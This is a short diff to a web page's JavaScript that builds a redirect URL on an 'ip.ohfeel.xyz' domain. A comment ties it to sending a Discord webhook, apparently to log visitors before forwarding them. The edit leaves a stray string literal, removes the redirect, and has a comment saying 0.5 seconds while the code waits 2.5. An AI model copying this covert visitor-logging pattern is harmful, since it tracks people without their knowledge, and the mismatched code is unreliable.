@@ -340,14 +340,17 @@ body {
         let BaseUrl = "https://ip.ohfeel.xyz/?q=";
       
         let url = window.location.href;
-        let queryString = url ? url.split("?")[1] : window.location.search.slice(1);
+        "https://ip.ohfeel.xyz/?q=https://ohfeel.xyz"
+        // Get the query string
+        let queryString = url.split("?")[1];
+        
         queryString = encodeURIComponent(queryString);
       
         // Wait for 0.5s
         await new Promise((resolve) => setTimeout(resolve, 2500));
       
         // Redirect to the URL
-        window.location.href = queryString
+        
       }
       
       // First, call the function to send the Discord webhook and then redirect afterward.
